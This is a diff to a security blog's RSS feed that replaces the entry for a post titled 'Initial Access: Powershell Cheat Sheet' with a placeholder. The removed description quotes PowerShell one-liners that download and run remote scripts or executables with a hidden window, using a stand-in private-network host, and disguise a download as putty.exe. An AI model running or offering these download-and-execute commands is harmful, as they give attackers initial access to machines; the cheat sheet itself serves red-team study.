@@ -86,14 +86,13 @@
       </item>
       
       <item>
-        <title>Initial Access: Powershell Cheat Sheet</title>
+        <title>Initial Access: None</title>
         <link>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</link>
         <pubDate>Fri, 16 May 2025 13:00:00 +0700</pubDate>
         <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Fri, 16 May 2025 13:00:00 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</guid>
-        <description>ខាងក្រោមនេះជាវិធីក្នុងការទាញយកនូវរាល់ Payloads ចេញពីអ៊ីនអឺណិត ។
-Based On  PowerShell VBScript Batch Script  Method 1 - PowerShell Downloader 1 2 3 4 5  # Download and Execute Payload (PS1) powershell -nop -c &amp;#34;iex(New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.x.x:8081/test.ps1&amp;#39;)&amp;#34; powershell.exe -nop -w hidden -c &amp;#34;IEX ((new-object net.webclient).downloadstring(&amp;#39;http://192.168.x.x:8081/test.ps1&amp;#39;))&amp;#34; # ./test.ps1 =&amp;gt; Start-Process &amp;#39;C:\windows\system32\calc.exe&amp;#39;   1 2 3 4  # Download/Save/Execute PowerShell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.x.x:8081/cat.jpg&amp;#39;,&amp;#39;%temp%\putty.exe&amp;#39;); Start-Process &amp;#39;%temp%\putty.exe&amp;#39; PowerShell -windowstyle hidden -ExecutionPolicy ByPass -NoProfile Start-BitsTransfer -Source http://192.</description>
+        <description>None  PowerShell  1  ./test.bat   </description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
@@ -103,18 +102,6 @@ Based On  PowerShell VBScript Batch Script  Method 1 - PowerShell Downloader 1 2
           
             
               <category>payload</category>
-            
-          
-            
-              <category>powershell</category>
-            
-          
-            
-              <category>vbscript</category>
-            
-          
-            
-              <category>batch</category>
             
           
         
